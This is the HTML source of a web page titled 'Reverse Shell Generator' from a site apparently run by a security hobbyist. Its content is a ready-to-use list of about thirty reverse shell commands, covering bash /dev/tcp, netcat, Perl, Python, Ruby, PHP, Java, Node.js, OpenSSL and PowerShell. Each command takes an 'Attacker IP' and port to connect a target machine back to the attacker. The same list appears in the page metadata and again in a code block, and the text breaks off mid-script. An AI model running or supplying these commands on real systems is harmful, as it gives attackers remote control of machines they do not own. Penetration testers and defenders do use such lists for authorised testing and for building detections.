+	<meta property="og:description" content="&lt;!DOCTYPE html&gt; 🔄 Reverse Shell Generator &lt;div id=&#34;input-form&#34;&gt; &lt;h3&gt;Configuration&lt;/h3&gt; &lt;div&gt; &lt;div&gt; &lt;label for=&#34;ip-input&#34;&gt;Attacker IP:&lt;/label&gt; &lt;input type=&#34;text&#34; id=&#34;ip-input&#34; placeholder=&#34;192.168.1.100&#34;&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&#34;port-input&#34;&gt;Port:&lt;/label&gt; &lt;input type=&#34;number&#34; id=&#34;port-input&#34; placeholder=&#34;4444&#34;&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&#34;category-select&#34;&gt;Category:&lt;/label&gt; &lt;select id=&#34;category-select&#34;&gt; &lt;option value=&#34;all&#34;&gt;All Shells&lt;/option&gt; &lt;option value=&#34;linux&#34;&gt;Linux&lt;/option&gt; &lt;option value=&#34;windows&#34;&gt;Windows&lt;/option&gt; &lt;option value=&#34;mac&#34;&gt;macOS&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;button onclick=&#34;generateShells()&#34; style=&#34;margin-top: 25px;&#34;&gt;Generate&lt;/button&gt; &lt;/div&gt; &lt;p class=&#34;info&#34;&gt;💡 Or use URL: &lt;code&gt;?ip:port&lt;/code&gt; (e.g., &lt;code&gt;?192.168.1.100:4444&lt;/code&gt;)&lt;/p&gt; &lt;/div&gt; &lt;div id=&#34;shells-container&#34; style=&#34;display: none;&#34;&gt; &lt;div id=&#34;shells-output&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div id=&#34;no-params&#34; class=&#34;no-params&#34;&gt; &lt;p&gt;Enter IP and Port to generate reverse shells&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; const shellDatabase = [ {name: &#34;Bash -i&#34;, command: &#34;bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Bash 196&#34;, command: &#34;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/{ip}/{port}; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Bash read line&#34;, command: &#34;exec 5&lt;&gt;/dev/tcp/{ip}/{port};cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Bash 5&#34;, command: &#34;bash -i 5&lt;&gt; /dev/tcp/{ip}/{port} 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Bash UDP&#34;, command: &#34;bash -i &gt;&amp; /dev/udp/{ip}/{port} 0&gt;&amp;1&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;nc mkfifo&#34;, command: &#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc {ip} {port} &gt;/tmp/f&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;nc -e&#34;, command: &#34;nc -e bash {ip} {port}&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;nc -c&#34;, command: &#34;nc -c bash {ip} {port}&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;BusyBox nc&#34;, command: &#34;busybox nc {ip} {port} -e bash&#34;, meta: [&#34;linux&#34;]}, {name: &#34;ncat -e&#34;, command: &#34;ncat {ip} {port} -e bash&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Perl&#34;, command: &#34;perl -e &#39;use Socket;$i=\&#34;{ip}\&#34;;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&#34;tcp\&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&#34;&gt;&amp;S\&#34;);open(STDOUT,\&#34;&gt;&amp;S\&#34;);open(STDERR,\&#34;&gt;&amp;S\&#34;);exec(\&#34;/bin/sh -i\&#34;);};&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Perl no sh&#34;, command: &#34;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\&#34;{ip}:{port}\&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Python&#34;, command: &#34;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;{ip}\&#34;,{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&#34;/bin/sh\&#34;,\&#34;-i\&#34;]);&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;Python3&#34;, command: &#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;{ip}\&#34;,{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\&#34;/bin/bash\&#34;)&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;Ruby&#34;, command: &#34;ruby -rsocket -e&#39;f=TCPSocket.new(\&#34;{ip}\&#34;,{port});exec sprintf(\&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\&#34;,f,f,f)&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;PHP fsockopen&#34;, command: &#34;php -r &#39;$sock=fsockopen(\&#34;{ip}\&#34;,{port});exec(\&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;, $pipes);&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;PHP shell_exec&#34;, command: &#34;php -r &#39;$sock=fsockopen(\&#34;{ip}\&#34;,{port});shell_exec(\&#34;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;);&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;PHP system&#34;, command: &#34;php -r &#39;$sock=fsockopen(\&#34;{ip}\&#34;,{port});system(\&#34;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;);&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;PHP passthru&#34;, command: &#34;php -r &#39;$sock=fsockopen(\&#34;{ip}\&#34;,{port});passthru(\&#34;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&#34;);&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;PHP backticks&#34;, command: &#34;php -r &#39;$sock=fsockopen(\&#34;{ip}\&#34;,{port});`/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;PHP proc_open&#34;, command: &#34;php -r &#39;$sock=fsockopen(\&#34;{ip}\&#34;,{port});$proc=proc_open(\&#34;/bin/bash\&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;Java&#34;, command: &#34;r = Runtime.getRuntime(); p = r.exec([\&#34;/bin/bash\&#34;,\&#34;-c\&#34;,\&#34;exec 5&lt;&gt;/dev/tcp/{ip}/{port};cat &lt;&amp;5 | while read line; do \\\\$line 2&gt;&amp;5 &gt;&amp;5; done\&#34;] as String[]).waitFor();&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;Node.js&#34;, command: &#34;require(&#39;child_process&#39;).exec(&#39;bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1&#39;)&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;, &#34;windows&#34;]}, {name: &#34;OpenSSL&#34;, command: &#34;mkfifo /tmp/s; bash -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect {ip}:{port} &gt; /tmp/s; rm /tmp/s&#34;, meta: [&#34;linux&#34;, &#34;mac&#34;]}, {name: &#34;PowerShell #1&#34;, command: &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;{ip}&#39;,{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback &#43; &#39;PS &#39; &#43; (pwd).Path &#43; &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#34;, meta: [&#34;windows&#34;]}, {name: &#34;PowerShell #2&#34;, command: &#34;powershell -nop -c \&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;{ip}&#39;,{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback &#43; &#39;PS &#39; &#43; (pwd).Path &#43; &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\&#34;&#34;, meta: [&#34;windows&#34;]}, {name: &#34;nc.exe&#34;, command: &#34;nc.exe {ip} {port} -e cmd.exe&#34;, meta: [&#34;windows&#34;]}, {name: &#34;ncat.exe&#34;, command: &#34;ncat.exe {ip} {port} -e cmd.exe&#34;, meta: [&#34;windows&#34;]} ]; window.addEventListener(&#39;load&#39;, function() { const params = new URLSearchParams(window.location.search); let ip = null, port = null; if (params.has(&#39;ip&#39;) &amp;&amp; params.has(&#39;port&#39;)) { ip = params.get(&#39;ip&#39;); port = params.get(&#39;port&#39;); } else { const firstParam = Array.from(params.keys())[0]; if (firstParam &amp;&amp; firstParam.includes(&#39;:&#39;)) { const parts = firstParam.split(&#39;:&#39;); ip = parts[0]; port = parts[1]; } } if (ip &amp;&amp; port) { document.getElementById(&#39;ip-input&#39;).value = ip; document.getElementById(&#39;port-input&#39;).value = port; generateShells(); } }); function generateShells() { const ip = document.getElementById(&#39;ip-input&#39;).value.trim(); const port = document.getElementById(&#39;port-input&#39;).value.trim(); const category = document.getElementById(&#39;category-select&#39;).value; if (!ip || !port) { alert(&#39;Please enter both IP and Port&#39;); return; } if (!/^\d&#43;\.\d&#43;\.\d&#43;\.\d&#43;$/.test(ip)) { alert(&#39;Invalid IP format&#39;); return; } if (isNaN(port) || port &lt; 1 || port &gt; 65535) { alert(&#39;Invalid port (1-65535)&#39;); return; } window.history.replaceState({}, &#39;&#39;, `?${ip}:${port}`); const output = document.getElementById(&#39;shells-output&#39;); output.innerHTML = &#39;&#39;; shellDatabase.forEach(shell =&gt; { if (category !== &#39;all&#39; &amp;&amp; !shell.meta.includes(category)) { return; } const command = shell.command.replace(/{ip}/g, ip).replace(/{port}/g, port); const platforms = shell.meta.map(m =&gt; { const icons = { linux: &#39;🐧&#39;, mac: &#39;🍎&#39;, windows: &#39;🪟&#39; }; return icons[m] || m; }).join(&#39; &#39;); const shellBox = document.createElement(&#39;div&#39;); shellBox.className = &#39;shell-box&#39;; shellBox.innerHTML = ` &lt;div style=&#34;display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;&#34;&gt; &lt;h3 style=&#34;margin: 0;&#34;&gt;${shell.name}&lt;/h3&gt; &lt;span&gt;${platforms}&lt;/span&gt; &lt;/div&gt; &lt;div class=&#34;shell-output&#34; id=&#34;shell-${shell.name.replace(/[^a-zA-Z0-9]/g, &#39;&#39;)}&#34;&gt;${command}&lt;/div&gt; &lt;button class=&#34;copy-btn&#34; onclick=&#34;copyToClipboard(&#39;shell-${shell.name.replace(/[^a-zA-Z0-9]/g, &#39;&#39;)}&#39;)&#34;&gt;Copy&lt;/button&gt; `; output.appendChild(shellBox); }); document.getElementById(&#39;shells-container&#39;).style.display = &#39;block&#39;; document.getElementById(&#39;no-params&#39;).style.display = &#39;none&#39;; } function copyToClipboard(elementId) { const element = document.getElementById(elementId); const text = element.textContent; navigator.clipboard.writeText(text).then(() =&gt; { const button = event.target; const originalText = button.textContent; button.textContent = &#39;✓ Copied!&#39;; button.style.background = &#39;#00aa00&#39;; setTimeout(() =&gt; { button.textContent = originalText; button.style.background = &#39;&#39;; }, 2000); }).catch(err =&gt; { alert(&#39;Failed to copy: &#39; &#43; err); }); } document.getElementById(&#39;ip-input&#39;).addEventListener(&#39;keypress&#39;, function(e) { if (e.key === &#39;Enter&#39;) generateShells(); }); document.getElementById(&#39;port-input&#39;).addEventListener(&#39;keypress&#39;, function(e) { if (e.key === &#39;Enter&#39;) generateShells(); }); document.getElementById(&#39;category-select&#39;).addEventListener(&#39;change&#39;, function(e) { const ip = document.getElementById(&#39;ip-input&#39;).value.trim(); const port = document.getElementById(&#39;port-input&#39;).value.trim(); if (ip &amp;&amp; port) { generateShells(); } }); &lt;/script&gt;">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:published_time" content="2025-01-01T00:00:00+00:00">
+		<meta property="article:modified_time" content="2025-01-01T00:00:00+00:00">
+
+
+
+
+<link rel="canonical" href="http://www.axolol.fr/rs/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.022594d625780e2edf64581b893d32cb35c11de5d88953ea4ad3c2e45451e214.css" integrity="sha256-AiWU1iV4Di7fZFgbiT0yyzXBHeXYiVPqStPC5FRR4hQ=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.ad48f476275974885bdc03d5251e3cdbe1678c54a63ff772376b0ed2adc468dd.css" integrity="sha256-rUj0didZdIhb3APVJR482&#43;FnjFSmP/dyN2sO0q3EaN0=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+  
+    
+    <link rel="stylesheet" href="/css/custom.min.2803245832877bb7ca208c9e145ce41e2279c9534bf142e70b8ae9fa98ce1851.css" integrity="sha256-KAMkWDKHe7fKIIyeFFzkHiJ5yVNL8ULnC4rp&#43;pjOGFE=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://www.axolol.fr/">
+      RedFish
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/rs/">Reverse Shell</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://www.axolol.fr/rs/">
+          Reverse Shell Generator
+        </a>
+      </h1>
+    </header>
+
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {margin: 0; padding: 0; box-sizing: border-box;}
+        body {background: #0a0a0a; color: #aaa; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; line-height: 1.6;}
+        .rs-container {max-width: 1200px; margin: 0 auto; padding: 40px 20px;}
+        h1 {color: #00ff00; margin-bottom: 30px; font-size: 32px;}
+        h3 {color: #00ff00; margin-bottom: 15px; font-size: 16px;}
+        #input-form {background: #1e1e1e; padding: 20px; border-radius: 8px; margin-bottom: 30px; border: 1px solid #444;}
+        #input-form div:first-child {display: flex; gap: 15px; flex-wrap: wrap; align-items: center;}
+        #input-form > div > div {display: flex; flex-direction: column;}
+        label {color: #aaa; display: block; margin-bottom: 5px; font-size: 14px;}
+        input, select {padding: 10px; border: 1px solid #555; background: #2a2a2a; color: #fff; border-radius: 4px; font-family: monospace; transition: all 0.2s ease;}
+        input:focus, select:focus {outline: none; border-color: #00ff00 !important; box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);}
+        #ip-input {width: 200px;}
+        #port-input {width: 150px;}
+        #category-select {width: 200px;}
+        button {padding: 10px 20px; background: #00aa00; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; transition: all 0.2s ease;}
+        button:hover {transform: scale(1.05); opacity: 0.9;}
+        button.copy-btn {padding: 5px 10px; background: #0066cc; font-size: 12px; margin-top: 10px;}
+        .shell-box {background: #1e1e1e; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #444;}
+        .shell-output {background: #0a0a0a; border: 1px solid #333; padding: 15px; border-radius: 4px; font-family: "Courier New", monospace; color: #00ff00; word-break: break-all; line-height: 1.5; max-height: 200px; overflow-y: auto; font-size: 12px;}
+        .no-params {background: #2a2a2a; padding: 20px; border-radius: 8px; border: 1px solid #555; color: #aaa; text-align: center;}
+        code {background: #2a2a2a; padding: 2px 6px; border-radius: 3px; font-family: monospace; color: #88ff88;}
+        p {color: #aaa; margin-bottom: 10px;}
+        .info {color: #888; font-size: 0.9em; margin-top: 10px;}
+    </style>
+</head>
+<body>
+    <div class="rs-container">
+        <h1>🔄 Reverse Shell Generator</h1>
+<pre><code>    &lt;div id=&quot;input-form&quot;&gt;
+        &lt;h3&gt;Configuration&lt;/h3&gt;
+        &lt;div&gt;
+            &lt;div&gt;
+                &lt;label for=&quot;ip-input&quot;&gt;Attacker IP:&lt;/label&gt;
+                &lt;input type=&quot;text&quot; id=&quot;ip-input&quot; placeholder=&quot;192.168.1.100&quot;&gt;
+            &lt;/div&gt;
+            &lt;div&gt;
+                &lt;label for=&quot;port-input&quot;&gt;Port:&lt;/label&gt;
+                &lt;input type=&quot;number&quot; id=&quot;port-input&quot; placeholder=&quot;4444&quot;&gt;
+            &lt;/div&gt;
+            &lt;div&gt;
+                &lt;label for=&quot;category-select&quot;&gt;Category:&lt;/label&gt;
+                &lt;select id=&quot;category-select&quot;&gt;
+                    &lt;option value=&quot;all&quot;&gt;All Shells&lt;/option&gt;
+                    &lt;option value=&quot;linux&quot;&gt;Linux&lt;/option&gt;
+                    &lt;option value=&quot;windows&quot;&gt;Windows&lt;/option&gt;
+                    &lt;option value=&quot;mac&quot;&gt;macOS&lt;/option&gt;
+                &lt;/select&gt;
+            &lt;/div&gt;
+            &lt;button onclick=&quot;generateShells()&quot; style=&quot;margin-top: 25px;&quot;&gt;Generate&lt;/button&gt;
+        &lt;/div&gt;
+        &lt;p class=&quot;info&quot;&gt;💡 Or use URL: &lt;code&gt;?ip:port&lt;/code&gt; (e.g., &lt;code&gt;?192.168.1.100:4444&lt;/code&gt;)&lt;/p&gt;
+    &lt;/div&gt;
+
+    &lt;div id=&quot;shells-container&quot; style=&quot;display: none;&quot;&gt;
+        &lt;div id=&quot;shells-output&quot;&gt;&lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;div id=&quot;no-params&quot; class=&quot;no-params&quot;&gt;
+        &lt;p&gt;Enter IP and Port to generate reverse shells&lt;/p&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script&gt;
+    const shellDatabase = [
+        {name: &quot;Bash -i&quot;, command: &quot;bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Bash 196&quot;, command: &quot;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/{ip}/{port}; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Bash read line&quot;, command: &quot;exec 5&lt;&gt;/dev/tcp/{ip}/{port};cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Bash 5&quot;, command: &quot;bash -i 5&lt;&gt; /dev/tcp/{ip}/{port} 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Bash UDP&quot;, command: &quot;bash -i &gt;&amp; /dev/udp/{ip}/{port} 0&gt;&amp;1&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;nc mkfifo&quot;, command: &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc {ip} {port} &gt;/tmp/f&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;nc -e&quot;, command: &quot;nc -e bash {ip} {port}&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;nc -c&quot;, command: &quot;nc -c bash {ip} {port}&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;BusyBox nc&quot;, command: &quot;busybox nc {ip} {port} -e bash&quot;, meta: [&quot;linux&quot;]},
+        {name: &quot;ncat -e&quot;, command: &quot;ncat {ip} {port} -e bash&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Perl&quot;, command: &quot;perl -e 'use Socket;$i=\&quot;{ip}\&quot;;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&quot;&gt;&amp;S\&quot;);open(STDOUT,\&quot;&gt;&amp;S\&quot;);open(STDERR,\&quot;&gt;&amp;S\&quot;);exec(\&quot;/bin/sh -i\&quot;);};'&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Perl no sh&quot;, command: &quot;perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\&quot;{ip}:{port}\&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Python&quot;, command: &quot;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;{ip}\&quot;,{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;Python3&quot;, command: &quot;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;{ip}\&quot;,{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\&quot;/bin/bash\&quot;)'&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;Ruby&quot;, command: &quot;ruby -rsocket -e'f=TCPSocket.new(\&quot;{ip}\&quot;,{port});exec sprintf(\&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\&quot;,f,f,f)'&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;PHP fsockopen&quot;, command: &quot;php -r '$sock=fsockopen(\&quot;{ip}\&quot;,{port});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;, $pipes);'&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;PHP shell_exec&quot;, command: &quot;php -r '$sock=fsockopen(\&quot;{ip}\&quot;,{port});shell_exec(\&quot;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;PHP system&quot;, command: &quot;php -r '$sock=fsockopen(\&quot;{ip}\&quot;,{port});system(\&quot;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;PHP passthru&quot;, command: &quot;php -r '$sock=fsockopen(\&quot;{ip}\&quot;,{port});passthru(\&quot;/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;PHP backticks&quot;, command: &quot;php -r '$sock=fsockopen(\&quot;{ip}\&quot;,{port});`/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;'&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;PHP proc_open&quot;, command: &quot;php -r '$sock=fsockopen(\&quot;{ip}\&quot;,{port});$proc=proc_open(\&quot;/bin/bash\&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);'&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;Java&quot;, command: &quot;r = Runtime.getRuntime(); p = r.exec([\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;exec 5&lt;&gt;/dev/tcp/{ip}/{port};cat &lt;&amp;5 | while read line; do \\\\$line 2&gt;&amp;5 &gt;&amp;5; done\&quot;] as String[]).waitFor();&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;Node.js&quot;, command: &quot;require('child_process').exec('bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1')&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;, &quot;windows&quot;]},
+        {name: &quot;OpenSSL&quot;, command: &quot;mkfifo /tmp/s; bash -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect {ip}:{port} &gt; /tmp/s; rm /tmp/s&quot;, meta: [&quot;linux&quot;, &quot;mac&quot;]},
+        {name: &quot;PowerShell #1&quot;, command: &quot;$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;, meta: [&quot;windows&quot;]},
+        {name: &quot;PowerShell #2&quot;, command: &quot;powershell -nop -c \&quot;$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\&quot;&quot;, meta: [&quot;windows&quot;]},
+        {name: &quot;nc.exe&quot;, command: &quot;nc.exe {ip} {port} -e cmd.exe&quot;, meta: [&quot;windows&quot;]},
+        {name: &quot;ncat.exe&quot;, command: &quot;ncat.exe {ip} {port} -e cmd.exe&quot;, meta: [&quot;windows&quot;]}
+    ];
+
+    window.addEventListener('load', function() {
+        const params = new URLSearchParams(window.location.search);
+        let ip = null, port = null;
+        if (params.has('ip') &amp;&amp; params.has('port')) {
+            ip = params.get('ip');
+            port = params.get('port');
+        } else {
